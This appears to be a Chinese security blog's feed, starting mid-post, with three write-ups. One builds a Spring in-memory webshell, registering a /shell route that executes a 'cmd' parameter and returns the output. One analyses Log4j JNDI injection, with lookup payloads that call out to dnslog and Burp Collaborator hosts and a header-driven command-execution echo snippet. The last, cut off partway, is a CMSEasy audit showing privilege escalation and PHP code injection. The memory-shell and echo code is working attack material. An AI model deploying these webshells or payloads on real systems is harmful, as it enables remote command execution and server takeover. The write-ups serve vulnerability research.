long startTime = System.currentTimeMillis();
Throwable failureCause = null;
//获取上一个请求保存的LocaleContext
    LocaleContext previousLocaleContext = LocaleContextHolder.getLocaleContext();
//建立新的LocaleContext
    LocaleContext localeContext = buildLocaleContext(request);
//获取上一个请求保存的RequestAttributes
    RequestAttributes previousAttributes = RequestContextHolder.getRequestAttributes();
//建立新的RequestAttributes
    ServletRequestAttributes requestAttributes = buildRequestAttributes(request, 
response, previousAttributes);
    WebAsyncManager asyncManager = WebAsyncUtils.getAsyncManager(request);
asyncManager.registerCallableInterceptor(FrameworkServlet.class.getName(), 
new RequestBindingInterceptor());
//具体设置的方法
    initContextHolders(request, localeContext, requestAttributes);
</code></pre>
<p><strong>现在来分析<code>WebApplicationContextUtils.getWebApplicationContext</code>方法源码</strong></p>
<pre><code class="language-java">//第一步
public static WebApplicationContext getWebApplicationContext(ServletContext sc) {
        return getWebApplicationContext(sc, WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE);
    }

//第二步
public static WebApplicationContext getWebApplicationContext(ServletContext sc, String attrName) {
        Assert.notNull(sc, &quot;ServletContext must not be null&quot;);
    	//attrName就是org.springframework.web.context.WebApplicationContext.ROOT
        Object attr = sc.getAttribute(attrName);
        if (attr == null) {
            return null;
        } else if (attr instanceof RuntimeException) {
            throw (RuntimeException)attr;
        } else if (attr instanceof Error) {
            throw (Error)attr;
        } else if (attr instanceof Exception) {
            throw new IllegalStateException((Exception)attr);
        } else if (!(attr instanceof WebApplicationContext)) {
            throw new IllegalStateException(&quot;Context attribute is not of type WebApplicationContext: &quot; + attr);
        } else {
            return (WebApplicationContext)attr;
        }
    }
</code></pre>
<p>跟进到方法内可以看到</p>
<figure data-type="image" tabindex="8"><a href="https://imgtu.com/i/TYIFr8"><img src="https://s4.ax1x.com/2021/12/24/TYIFr8.png" alt="TYIFr8.png" loading="lazy"></a></figure>
<p>该函数有两个参数,ServletContext和获取属性的字符串。ServletContext官方叫servlet上下文。JavaEE标准规定：在项目启动时，<strong>Servlet容器（Tomcat、Jboss等）<strong>需要给项目初始化一个</strong>ServletContext</strong>。作为公共环境容器存放公共信息，而ServletContext中的信息都是由容器提供的。服务器会为每一个工程创建一个对象，这个对象就是ServletContext对象。这个对象全局唯一，而且工程内部的所有servlet都共享这个对象。所以叫全局应用程序共享对象。而<font color="red">WebApplicationContext 是 SpringMVC 中对 ApplicationContext 的具体实现</font>，每个 ServletContext 下只会有一个 WebApplicationContext ，在应用初始化时就创建出来了，而不是等浏览器请求来了才创建。</p>
<p>可以在 org.springframework.web.context的 contextloader.initWebApplicationContext中观察到</p>
<figure data-type="image" tabindex="9"><a href="https://imgtu.com/i/TYIKx0"><img src="https://s4.ax1x.com/2021/12/24/TYIKx0.png" alt="TYIKx0.png" loading="lazy"></a></figure>
<p>其原理十分简单，<font color="red">在spring容器初始化的方法ContextLoader.initWebApplicationContext(ServletContext)中通过servletContext.setAttribute(WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE, this.context);</font>已经将WebApplicationContext的实例放入ServletContext 中了。</p>
<p>然后在工具类的WebApplicationContextUtils.getWebApplicationContext(ServletContext)方法中就可以通过传入的ServletContext参数获取到WebApplicationContext实例了。<br>
<strong>结果</strong></p>
<figure data-type="image" tabindex="10"><a href="https://imgtu.com/i/TYIiKf"><img src="https://s4.ax1x.com/2021/12/24/TYIiKf.png" alt="TYIiKf.png" loading="lazy"></a></figure>
<h4 id="方法三-requestcontextutils-是方法二的简化">方法三: RequestContextUtils 是方法二的简化</h4>
<pre><code class="language-java">WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
</code></pre>
<p>其实在方法二中我们已经可以看到拿到request对象后已经能直接getAttribute获取上下文,实际上我们做个比较就能判断两者是否一致</p>
<figure data-type="image" tabindex="11"><a href="https://imgtu.com/i/TYI1qU"><img src="https://s4.ax1x.com/2021/12/24/TYI1qU.png" alt="TYI1qU.png" loading="lazy"></a></figure>
<h4 id="方法四-getattribute">方法四: getAttribute</h4>
<pre><code>WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);
</code></pre>
<p>在上文的分析中，我们知道RequestContextHolder可以直接拿到request。</p>
<p>但是为什么呢?</p>
<p>我们接着看他的源码</p>
<pre><code class="language-java">public abstract class RequestContextHolder {
    private static final boolean jsfPresent = ClassUtils.isPresent(&quot;javax.faces.context.FacesContext&quot;, RequestContextHolder.class.getClassLoader());
    private static final ThreadLocal&lt;RequestAttributes&gt; requestAttributesHolder = new NamedThreadLocal(&quot;Request attributes&quot;);
    private static final ThreadLocal&lt;RequestAttributes&gt; inheritableRequestAttributesHolder = new NamedInheritableThreadLocal(&quot;Request context&quot;);

    public RequestContextHolder() {
    }

    public static RequestAttributes getRequestAttributes() {
        RequestAttributes attributes = (RequestAttributes)requestAttributesHolder.get();
        if (attributes == null) {
            attributes = (RequestAttributes)inheritableRequestAttributesHolder.get();
        }

        return attributes;
    }
    public static RequestAttributes currentRequestAttributes() throws IllegalStateException {
        RequestAttributes attributes = getRequestAttributes();
    ......................
</code></pre>
<p>可以看到getRequestAttributes直接从ThreadLocal取出attributes,ThreadLocal是什么不再赘述。</p>
<p>ThreadLocal的值又是来自上文分析的processRequest中的initContextHolders设置的，而实际上只要跟一下initContextHolders就可以发现塞了上下文进去，所以在这里能通过ThreadLocal取到上下文</p>
<figure data-type="image" tabindex="12"><a href="https://imgtu.com/i/TYI8ZF"><img src="https://s4.ax1x.com/2021/12/24/TYI8ZF.png" alt="TYI8ZF.png" loading="lazy"></a></figure>
<figure data-type="image" tabindex="13"><a href="https://imgtu.com/i/TYIJIJ"><img src="https://s4.ax1x.com/2021/12/24/TYIJIJ.png" alt="TYIJIJ.png" loading="lazy"></a></figure>
<h3 id="0x02-02-怎么手动注册">0X02-02 怎么手动注册?</h3>
<p>还是需要先了解一下前置知识，什么是Spring  Bean</p>
<blockquote>
<ul>
<li>bean是对象，一个或者多个不限定</li>
<li>bean由Spring中一个叫IoC的东西管理</li>
<li>我们的应用程序由一个个bean构成</li>
</ul>
</blockquote>
<p>再理解一下什么叫IOC容器</p>
<blockquote>
<p>IOC容器就是具有依赖注入功能的容器，IOC容器负责实例化、定位、配置应用程序中的对象及建立这些对象间的依赖。应用程序无需直接在代码中new相关的对象，应用程序由IOC容器进行组装。在Spring中BeanFactory是IOC容器的实际代表者。</p>
</blockquote>
<p>最重要的:<font color="red">由IOC容器管理的那些组成应用程序的对象我们就叫它Bean</font>， Bean就是由Spring容器初始化、装配及管理的对象，除此之外，bean就与应用程序中的其他对象没有什么区别了。</p>
<p>可以参考下这篇文章理解</p>
<blockquote>
<p>https://www.cnblogs.com/linjiqin/archive/2013/11/04/3407126.html</p>
</blockquote>
<pre><code class="language-java">/*
如何获取IOC容器并完成我们需要的功能呢？首先应该实例化一个IOC容器，然后从容器中获取需要的对象，然后调用接口完成我们需要的功能，代码示例如下
*/
public class HelloServiceTest {
    @Test
    public void testHelloWorld() {
        // 1、读取配置文件实例化一个IOC容器
        ApplicationContext context = new ClassPathXmlApplicationContext(&quot;helloworld.xml&quot;);
        // 2、从容器中获取Bean，注意此处完全“面向接口编程，而不是面向实现”
        HelloService helloService = context.getBean(&quot;helloService&quot;, HelloService.class);
        // 3、执行业务逻辑
        helloService.sayHello();
    }
}
</code></pre>
<p>在参考文章中看到了熟悉的字眼<strong>ApplicationContext context</strong>。经过上面的学习，我们知道ApplicationContext 是容器初始化后的上下文,这里为啥跟IOC容器关联起来了呢。</p>
<p>原因如下</p>
<blockquote>
<p>在Spring IOC容器的代表就是org.springframework.beans包中的BeanFactory接口，BeanFactory接口提供了IOC容器最基本功能；而org.springframework.context包下的ApplicationContext接口扩展了BeanFactory</p>
</blockquote>
<p>这一点跟一下代码就知道了</p>
<figure data-type="image" tabindex="14"><a href="https://imgtu.com/i/TYIti9"><img src="https://s4.ax1x.com/2021/12/24/TYIti9.png" alt="TYIti9.png" loading="lazy"></a></figure>
<p>现在言归正传，我们知道在spring 中全都可以看做bean。那么我们之前静态的注册requestMapping的方法是否也可以看做一个bean呢?</p>
<p>答案是可以的。</p>
<pre><code class="language-java">// 从context中获得 RequestMappingHandlerMapping 的实例
RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
</code></pre>
<p>RequestMappingHandlerMapping对象是用于注册controller的</p>
<p>它继承了AbstractHandlerMethodMapping，在AbstractHandlerMethodMapping中提供了registerMapping方法</p>
<figure data-type="image" tabindex="15"><a href="https://imgtu.com/i/TYINGR"><img src="https://s4.ax1x.com/2021/12/24/TYINGR.png" alt="TYINGR.png" loading="lazy"></a></figure>
<p>需要三个参数</p>
<ol>
<li>
<p>mapping需要提供一个RequestMappingInfo类的实例。</p>
<figure data-type="image" tabindex="16"><a href="https://imgtu.com/i/TYIaxx"><img src="https://s4.ax1x.com/2021/12/24/TYIaxx.png" alt="TYIaxx.png" loading="lazy"></a></figure>
<p>RequestMappingInfo其实就是@RequestMapping注解里面提供信息的一个包装类，这里我们只用设置url和method</p>
<pre><code class="language-java">// 定义访问 controller 的 URL 地址
PatternsRequestCondition url = new PatternsRequestCondition(&quot;/shell&quot;);
// 定义允许访问 controller 的 HTTP 方法（GET/POST）
RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
//注册mappinginfo信息
RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
</code></pre>
</li>
<li>
<p>hanlder表示处理该url的类的实例，内存马肯定是恶意类这个类，但是如果new 这个类的话就会一直循环，所以我们可以整一个有参构造方法避免循环</p>
<pre><code class="language-java">// 创建用于处理请求的对象，加入“aaa”参数是为了触发第二个构造函数避免无限循环
InjectToController injectToController = new InjectToController(&quot;aaa&quot;);
</code></pre>
</li>
<li>
<p>Method就是分配给该路由的方法，这里我们可以利用反射获取该恶意类的方法。方法里可以写任何你想要的东西</p>
<pre><code class="language-java">// 通过反射获得自定义恶意类中test的 Method 对象
Method method2 = InjectToController.class.getMethod(&quot;test&quot;);
</code></pre>
</li>
</ol>
<p>最后整合上面的信息注册:</p>
<pre><code class="language-java">mappingHandlerMapping.registerMapping(info, injectToController, method2);
</code></pre>
<h3 id="0x02-03-自定义方法回显">0x02-03 自定义方法，回显</h3>
<p>在之前其实已经谈过这个问题，目标就是获取输入并且输出。</p>
<p>所以我们需要获取当前的request和response两个对象。</p>
<p>还是可以用之前提过的RequestContextHolder这个工具类来实现，实际上在上文中我们已经利用它来获取request了</p>
<pre><code class="language-java">// 获取request和response对象
HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
</code></pre>
<p>在request中接受我们想要的参数，在java代码中执行该参数的值,这里输出response时可以用getwriter和getOutputStream</p>
<pre><code class="language-java">// 获取cmd参数并执行命令
String cmd= request.getParameter(&quot;cmd&quot;);
String res=new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;).next();
response.getOutputStream().println(res);
response.flushBuffer();
</code></pre>
<h2 id="0x03-效果演示">0X03 效果演示</h2>
<p>访问靶机/shell路径为404</p>
<figure data-type="image" tabindex="17"><a href="https://imgtu.com/i/TYIwM6"><img src="https://s4.ax1x.com/2021/12/24/TYIwM6.png" alt="TYIwM6.png" loading="lazy"></a></figure>
<p>使用靶机-log4j远程命令执行，注入恶意类</p>
<figure data-type="image" tabindex="18"><a href="https://imgtu.com/i/TYI0sK"><img src="https://s4.ax1x.com/2021/12/24/TYI0sK.png" alt="TYI0sK.png" loading="lazy"></a></figure>
<figure data-type="image" tabindex="19"><a href="https://imgtu.com/i/TYIrZD"><img src="https://s4.ax1x.com/2021/12/24/TYIrZD.png" alt="TYIrZD.png" loading="lazy"></a></figure>
<p>再次访问/shell?cmd=whoami,已经得到回显</p>
<p><a href="https://imgtu.com/i/TYIsde"><img src="https://s4.ax1x.com/2021/12/24/TYIsde.png" alt="TYIsde.png" loading="lazy"></a><br>
弹个计算器试试<br>
<a href="https://imgtu.com/i/TYbOqP"><img src="https://s4.ax1x.com/2021/12/24/TYbOqP.gif" alt="TYbOqP.gif" loading="lazy"></a></p>
<h2 id="参考文章">参考文章</h2>
<blockquote>
<p>https://blog.csdn.net/x_iya/article/details/77758069 bean和webapplication</p>
<p>https://www.cnblogs.com/rancho-blog/p/7011176.html servletcontext初始化时创建webapplicationContext</p>
<p>https://blog.csdn.net/qq_42154259/article/details/107343764  求上下文持有者：RequestContextHolder</p>
<p><strong>为啥request能取出上下文</strong></p>
<p>https://blog.csdn.net/liqun_super/article/details/107999644  Spring MVC 之RequestContextHolder</p>
<p>**https://www.cnblogs.com/shuilangyizu/p/8621669.html</p>
<p>https://www.jianshu.com/p/58d3ed37a20c 什么是Spring bean</p>
<p>https://blog.csdn.net/jike11231/article/details/106229560</p>
<p>https://blog.csdn.net/weixin_44580977/article/details/103949602</p>
<p>https://blog.csdn.net/liangsheng_g/article/details/110855327</p>
<p>https://www.cnblogs.com/bitterz/p/14820898.html</p>
<p>https://www.cnblogs.com/xiaoxi/p/6164383.html</p>
<p>https://blog.csdn.net/GAMEloft9/article/details/81625348</p>
<p>https://www.cnblogs.com/chenbenbuyi/p/7470834.html</p>
</blockquote>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Log4j-年轻人的第一次研究]]></title>
        <id>https://ja9er.github.io/post/log4j-nian-qing-ren-de-di-yi-ci-yan-jiu/</id>
        <link href="https://ja9er.github.io/post/log4j-nian-qing-ren-de-di-yi-ci-yan-jiu/">
        </link>
        <updated>2021-12-20T10:08:06.000Z</updated>
        <content type="html"><![CDATA[<p><strong>简单跟一下代码XD</strong></p>
<h1 id="0x01-搭建环境">0X01 搭建环境</h1>
<p>IDEA 生成maven项目，简单配置pom.xml</p>
<pre><code class="language-xml">    &lt;dependencies&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
            &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;
            &lt;version&gt;2.14.1&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;
            &lt;version&gt;2.14.1&lt;/version&gt;
        &lt;/dependency&gt;
    &lt;/dependencies&gt;
</code></pre>
<p>生成测试类</p>
<pre><code class="language-java">import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.lookup.JndiLookup;
public class test {
    public static final Logger logger = LogManager.getLogger(test.class);
    public static void main(String[] args) {
        System.out.println(&quot;version: 2.14.1&quot;);
        logger.error(&quot;${jndi:dns://${hostName}.dnslog.cn}&quot;);
    }
}
</code></pre>
<h1 id="0x02-分析">0x02 分析</h1>
<h2 id="先问是不是再问有没有">先问是不是，再问有没有</h2>
<p>因为自己跟很麻烦(主要是因为菜...)，先剽窃一手其他师傅的结论。</p>
<p>问题点出在<code>org.apache.logging.log4j.core.lookup.JndiLookup</code></p>
<p>直接打断点</p>
<p>跟踪断点发现，在测试类中实例化logger类的过程中，</p>
<figure data-type="image" tabindex="1"><a href="https://imgtu.com/i/Tu1taj"><img src="https://s4.ax1x.com/2021/12/20/Tu1taj.png" alt="Tu1taj.png" loading="lazy"></a></figure>
<p>根据关键词建立对应类的映射关系</p>
<figure data-type="image" tabindex="2"><a href="https://imgtu.com/i/Tu13M8"><img src="https://s4.ax1x.com/2021/12/20/Tu13M8.png" alt="Tu13M8.png" loading="lazy"></a></figure>
<p>这是一个大前提。</p>
<p>现在回到JNDILOOKUP，直接在函数<code>lookup</code>中下断点，开始DEBUG。</p>
<figure data-type="image" tabindex="3"><a href="https://imgtu.com/i/Tu1NIs"><img src="https://s4.ax1x.com/2021/12/20/Tu1NIs.png" alt="Tu1NIs.png" loading="lazy"></a></figure>
<figure data-type="image" tabindex="4"><a href="https://imgtu.com/i/Tu1ain"><img src="https://s4.ax1x.com/2021/12/20/Tu1ain.png" alt="Tu1ain.png" loading="lazy"></a></figure>
<p>可以看到IDEA很方便的给出了调用栈。其实在实际的跟踪过程中发现，红框前面的函数基本都是在套娃。没有具体的动作</p>
<p><strong>像这样</strong></p>
<figure data-type="image" tabindex="5"><a href="https://imgtu.com/i/Tu10zV"><img src="https://s4.ax1x.com/2021/12/20/Tu10zV.png" alt="Tu10zV.png" loading="lazy"></a></figure>
<p>随着套娃来到第一个关键点<code>MessagePatternConverter.format()</code>,我们可以看到这里官方主动判断**${**符号，进入replace函数</p>
<figure data-type="image" tabindex="6"><a href="https://imgtu.com/i/Tu1wR0"><img src="https://s4.ax1x.com/2021/12/20/Tu1wR0.png" alt="Tu1wR0.png" loading="lazy"></a></figure>
<figure data-type="image" tabindex="7"><a href="https://imgtu.com/i/Tu1dGq"><img src="https://s4.ax1x.com/2021/12/20/Tu1dGq.png" alt="Tu1dGq.png" loading="lazy"></a></figure>
<p>replace又是套娃，继续跟进到<code>StrSubstitutor.substitute()</code>,这里对传入的变量处理，剔除出额外的字符串</p>
<pre><code class="language-java">此时varNameExpr=&quot;jndi:ldap://0tubdem0sszb8wlxw9w0pmpprgx6lv.burpcollaborator.net&quot;
</code></pre>
<figure data-type="image" tabindex="8"><a href="https://imgtu.com/i/Tu1rsU"><img src="https://s4.ax1x.com/2021/12/20/Tu1rsU.png" alt="Tu1rsU.png" loading="lazy"></a></figure>
<p>然后继续处理字符串，最终把值赋给<strong>varname</strong></p>
<p>等处理过程完成后调用<code>resolveVariable</code>函数，定睛一看，诶怎么就直接冒了一个lookup出来呢?</p>
<figure data-type="image" tabindex="9"><a href="https://imgtu.com/i/Tu16Z4"><img src="https://s4.ax1x.com/2021/12/20/Tu16Z4.png" alt="Tu16Z4.png" loading="lazy"></a></figure>
<figure data-type="image" tabindex="10"><a href="https://imgtu.com/i/Tu1sLF"><img src="https://s4.ax1x.com/2021/12/20/Tu1sLF.png" alt="Tu1sLF.png" loading="lazy"></a></figure>
<h2 id="揭开谜底-jndilookup在哪里">揭开谜底--JNDILookup在哪里?</h2>
<p>原来是此时和开始初始化的内容呼应上了</p>
<p><code>getVariableResolver</code>这个函数获取的内容由<code>return this.variableResolver;</code>返回，返回的是StrSubstitutor这个类的variableResolver，而StrSubstitutor的内容又来自<code>Interpolator</code>类，也就是初始化用到的那个类，值也是之前的。</p>
<figure data-type="image" tabindex="11"><a href="https://imgtu.com/i/Tu1cdJ"><img src="https://s4.ax1x.com/2021/12/20/Tu1cdJ.png" alt="Tu1cdJ.png" loading="lazy"></a></figure>
<p>进入<code>resolver.lookup</code>可以看到，截取字符串获取前缀prefix,这里就是jndi。</p>
<figure data-type="image" tabindex="12"><a href="https://imgtu.com/i/Tu1RiR"><img src="https://s4.ax1x.com/2021/12/20/Tu1RiR.png" alt="Tu1RiR.png" loading="lazy"></a></figure>
<p><strong>jndi前缀对应JndILookup</strong>也是初始化后已经建立好的关系。</p>
<h2 id="可控的lookup变量">可控的lookup变量</h2>
<p>进入JNDILookup之后就很顺利，继续跟踪函数定位到<code>org.apache.logging.log4j.core.lookup.JndiLookup</code>类的lookup方法.</p>
<p>到这一步其实已经豁然开朗了，当一个lookup的参数可控无过滤，我们有什么理由不认为这是个<font color='red'><strong>JNDI注入</strong></font>呢？</p>
<figure data-type="image" tabindex="13"><a href="https://imgtu.com/i/Tu1WJ1"><img src="https://s4.ax1x.com/2021/12/20/Tu1WJ1.png" alt="Tu1WJ1.png" loading="lazy"></a></figure>
<h1 id="0x03-利用">0X03 利用</h1>
<p>经过分析，可以看到这个漏洞并无什么苛刻的要求。只要是调用了log4j2的记录功能且用户可以控制输入即可。</p>
<p>简单易用，表现在实战中就是见框就插，header里面除了payload啥都没有(笑)。</p>
<p>如果想RCE，则需要先写好恶意类，再编译成class。和反序列化的利用过程一模一样。</p>
<figure data-type="image" tabindex="14"><a href="https://imgtu.com/i/Tu1IsO"><img src="https://s4.ax1x.com/2021/12/20/Tu1IsO.png" alt="Tu1IsO.png" loading="lazy"></a></figure>
<h1 id="0x04-差点什么">0X04 差点什么?</h1>
<p>麻烦的回弹shell显然没有直接执行命令且回显来的爽快。作为菜鸡也是很羡慕大佬们的操作的。那么，怎么才能把想要的结果回显到网页的中呢?</p>
<h2 id="理解什么是jndi注入">理解什么是JNDI注入?</h2>
<blockquote>
<ol>
<li>目标代码中调用了InitialContext.lookup(URI)，且URI为用户可控；</li>
<li>攻击者控制URI参数为恶意的RMI服务地址，如：rmi://hacker_rmi_server//name；</li>
<li>攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类；</li>
<li>目标在进行lookup()操作时，会动态加载并实例化Factory类，接着调用factory.getObjectInstance()获取外部远程对象实例；</li>
<li>攻击者可以在Factory类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到RCE的效果；</li>
</ol>
</blockquote>
<p>根据原理可知，JNDI注入实际上是去拉取受攻击者控制的恶意服务器上的恶意类回来动态加载。</p>
<h2 id="回显获取response和request">回显?获取response和request!</h2>
<p>根据我粗浅的开发经验，只要能拿到<code>Request</code> 和<code>Response</code>对象即可进行回显的构造，当然这也是众多方式的一种。也是目前用的较多的方式。</p>
<h2 id="实践">实践</h2>
<p>配置一个spring+log4j+mybits靶场</p>
<p>https://github.com/Ode1esse/springboot-login-log4j2</p>
<h3 id="response劫持"><strong>response劫持</strong></h3>
<p>怎么观察中间件的response？在返回时打断点</p>
<figure data-type="image" tabindex="15"><a href="https://imgtu.com/i/Tu1oLD"><img src="https://s4.ax1x.com/2021/12/20/Tu1oLD.md.png" alt="Tu1oLD.md.png" loading="lazy"></a></figure>
<p><strong>通过及时表达式，手动查看当前线程上下文(也就是Thread.currentThread())的threadLocals</strong></p>
<figure data-type="image" tabindex="16"><a href="https://imgtu.com/i/Tu18sS"><img src="https://s4.ax1x.com/2021/12/20/Tu18sS.png" alt="Tu18sS.png" loading="lazy"></a></figure>
<p>通过查看threadlocals的tables的值找到request和response所在的位置，这里是14</p>
<figure data-type="image" tabindex="17"><a href="https://imgtu.com/i/Tu1Gqg"><img src="https://s4.ax1x.com/2021/12/20/Tu1Gqg.png" alt="Tu1Gqg.png" loading="lazy"></a></figure>
<p><strong>修改response的输出流</strong></p>
<pre><code class="language-java">((ServletRequestAttributes) Thread.currentThread().threadLocals.table[14].value).response.getOutputStream().println(&quot;change response----------------------------&quot;)
</code></pre>
<p><strong>这里可以用</strong> <strong>getOutputStream 或者 getwrite 具体看报错</strong></p>
<figure data-type="image" tabindex="18"><a href="https://imgtu.com/i/Tu1lxf"><img src="https://s4.ax1x.com/2021/12/20/Tu1lxf.png" alt="Tu1lxf.png" loading="lazy"></a></figure>
<p>最后放包得到响应，可以看到结果之前多了我们修改的字符</p>
<figure data-type="image" tabindex="19"><a href="https://imgtu.com/i/Tu1YZQ"><img src="https://s4.ax1x.com/2021/12/20/Tu1YZQ.png" alt="Tu1YZQ.png" loading="lazy"></a></figure>
<h3 id="可回显的spring马">可回显的spring马</h3>
<p>上面只是研究了一下怎么简单的更改回显。实际需要改的地方还是很多的。</p>
<p>实际上spring有自己获取request和response的地方</p>
<p>https://github.com/feihong-cs/Java-Rce-Echo</p>
<pre><code class="language-java">org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();
        
javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();
        
javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();

        String cmd = httprequest.getHeader(&quot;cmd&quot;);
		if(cmd != null &amp;&amp; !cmd.isEmpty()){
			String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;).next();
			httpresponse.getWriter().println(res);
		}
</code></pre>
<p>我们改改就可以用</p>
<figure data-type="image" tabindex="20"><a href="https://imgtu.com/i/Tu1fRx"><img src="https://s4.ax1x.com/2021/12/20/Tu1fRx.md.png" alt="Tu1fRx.md.png" loading="lazy"></a></figure>
<h3 id="效果">效果</h3>
<figure data-type="image" tabindex="21"><a href="https://imgtu.com/i/TKSREQ"><img src="https://s4.ax1x.com/2021/12/21/TKSREQ.png" alt="TKSREQ.png" loading="lazy"></a></figure>
<h1 id="0x05-结语">0x05 结语</h1>
<p>LOL</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CMSEASY-从黑盒到代码审计]]></title>
        <id>https://ja9er.github.io/post/cmseasy-cong-hei-he-dao-dai-ma-shen-ji/</id>
        <link href="https://ja9er.github.io/post/cmseasy-cong-hei-he-dao-dai-ma-shen-ji/">
        </link>
        <updated>2021-09-22T10:03:35.000Z</updated>
        <content type="html"><![CDATA[<h1 id="0x01-开始的故事">0x01 开始的故事</h1>
<p><strong>中秋时节，秋高气爽，正是日(划)站(水)的好日子,刚好学习一波。</strong><br>
官网更新历史版本观察<br>
<img src="https://forum.ywhack.com/attachments/month_2109/2109181641160a30fdc89fa651.png" alt="" loading="lazy"><br>
两个版本都下<br>
使用beyond compare diff 文件内容<br>
结果发现并没有diff出什么内容来<br>
<img src="https://forum.ywhack.com/attachments/month_2109/21091816434e138746e1aefb18.png" alt="" loading="lazy"><br>
索性还是黑盒测一波吧<br>
看了看测出三个问题:</p>
<ul>
<li><strong>sql</strong></li>
<li><strong>代码执行</strong></li>
<li><strong>越权</strong></li>
</ul>
<hr>
<h1 id="0x02-看看越权">0x02 看看越权</h1>
<p>admin 超级管理员<br>
test  游客</p>
<figure data-type="image" tabindex="1"><img src="https://z3.ax1x.com/2021/09/22/4N7lnJ.png" alt="4N7lnJ.png" loading="lazy"></figure>
<p><strong>test</strong>用户无权登录后台</p>
<figure data-type="image" tabindex="2"><img src="https://z3.ax1x.com/2021/09/22/4N7u1U.png" alt="4N7u1U.png" loading="lazy"></figure>
<p>用test的cookie添加内容</p>
<figure data-type="image" tabindex="3"><img src="https://z3.ax1x.com/2021/09/22/4N71B9.png" alt="4N71B9.png" loading="lazy"></figure>
<p>看到这里添加成功</p>
<figure data-type="image" tabindex="4"><img src="https://z3.ax1x.com/2021/09/22/4N7MX4.png" alt="4N7MX4.png" loading="lazy"></figure>
<hr>
<p>展开讲讲：</p>
<p>add_action()鉴权只明确了是否存在该用户，并未对用户权限做限制<br>
<img src="https://z3.ax1x.com/2021/09/22/4N7ju4.png" alt="4N7ju4.png" loading="lazy"><br>
<img src="https://z3.ax1x.com/2021/09/22/4NHSER.png" alt="4NHSER.png" loading="lazy"></p>
<hr>
<h1 id="0x03-代码执行代码执行">0x03 代码执行！代码执行！</h1>
<p>内容管理模块，创建内容修改包内为PHPINFO<br>
<img src="https://z3.ax1x.com/2021/09/22/4N7KcF.png" alt="4N7KcF.png" loading="lazy"><br>
<img src="https://z3.ax1x.com/2021/09/22/4N737R.png" alt="4N737R.png" loading="lazy"><br>
<strong>分析</strong><br>
<strong>先摆结论:</strong></p>
<p>insert语句拼接时使用**.=**连接以及没有过滤好，是造成这个漏洞的原因</p>
<p>最后insert语句为:</p>
<pre><code class="language-sql">INSERT INTO `cmseasy_archive`(`checked`,`catid`,`title`,`color`,`langid`,`mtitle`,`keyword`,`description`,`tag`,`htmlrule`,`set_htmlrule`,`thumb`,`attachment_path`,`attachment_id`,`typeid`,`spid`,`subtitle`,`template`,`templatewap`,`nofollow`,`toppost`,`showform`,`introduce`,`adddate`,`updatedate`,`outtime`,`author`,`attr3`,`view`,`linkto`,`province_id`,`city_id`,`section_id`,`content`,`username`,`userid`,`strong`,`pics`,`attr1`,`introduce_len`,`type`,`state`,`listorder`,`readmenoy`,`domwmenoy`) VALUES ('1','1','phpinfo','#000000','1','','','','','','','','','','0','0','','0','0','0','0','0','','2021-09-18 11:23:13','2021-09-18 11:23:13','','admin','','','','0','0','0','&lt;?PHP PHPINFO();?&gt;','admin','1','0','N;','','0','','1','0','0','0')
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://z3.ax1x.com/2021/09/22/4N7BBd.png" alt="4N7BBd.png" loading="lazy"></figure>
<p>从路由开始跟踪:</p>
<p>index.php下</p>
<p>$front-&gt;dispatch();根据参数中的值分配路由</p>
<pre><code class="language-php">try{
    $front = new front();
    $front-&gt;dispatch();
}catch(HttpErrorException $e){
    if(config::get('custom404') &amp;&amp; $e-&gt;statusCode == 404){
        header('location: /404.php');
    }else{
        exit($e-&gt;statusCode.':'.$e-&gt;getMessage());
    }
}
</code></pre>
<p>断点进去看看</p>
<figure data-type="image" tabindex="6"><img src="https://z3.ax1x.com/2021/09/22/4N7sAI.png" alt="4N7sAI.png" loading="lazy"></figure>
<p>可以看到front类就是index页面下调用的类，$case的值如下</p>
<pre><code class="language-php">$case = self::$case . (self::$admin &amp;&amp; self::$case &lt;&gt; 'admin' &amp;&amp; self::$case &lt;&gt; 'install' ? '_admin' : '_act');
</code></pre>
<p>self::$case在_construct()内获取也就是初始化的时候获取，若存在case则进入该路由，如果没有则返回index</p>
<p><img src="https://z3.ax1x.com/2021/09/22/4N764P.png" alt="4N764P.png" loading="lazy"><br>
<img src="https://z3.ax1x.com/2021/09/22/4N7yNt.png" alt="4N7yNt.png" loading="lazy"></p>
<p>同时在__constructc中获取参数</p>
<figure data-type="image" tabindex="7"><img src="https://z3.ax1x.com/2021/09/22/4N7238.png" alt="4N7238.png" loading="lazy"></figure>
